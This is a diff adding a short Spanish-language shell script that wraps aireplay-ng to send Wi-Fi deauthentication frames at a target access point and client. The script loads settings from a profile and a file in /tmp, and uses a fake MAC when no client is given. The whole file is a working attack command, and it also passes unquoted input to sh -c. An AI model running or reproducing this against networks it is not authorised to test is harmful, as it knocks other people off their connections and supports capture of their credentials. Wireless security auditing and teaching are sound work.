@@ -1,0 +1,24 @@
+if [ $# -eq 0 ]
+then
+  printf "\n\nUso: $0 perfil opciones-aireplay-ng\n"
+  exit 1
+fi
+
+tmpfich=/tmp/wifi-scripts
+. $tmpfich
+. $1
+
+ejecutar()
+{
+  printf "Ejecutando: $1...\n\n"
+  sh -c "$1"
+}
+
+if [ -z $CLIENT ]
+then
+  CLIENT=$FAKE
+fi
+
+shift
+
+ejecutar "aireplay-ng --deauth 5 -a $BSSID -c $CLIENT $IF $*"
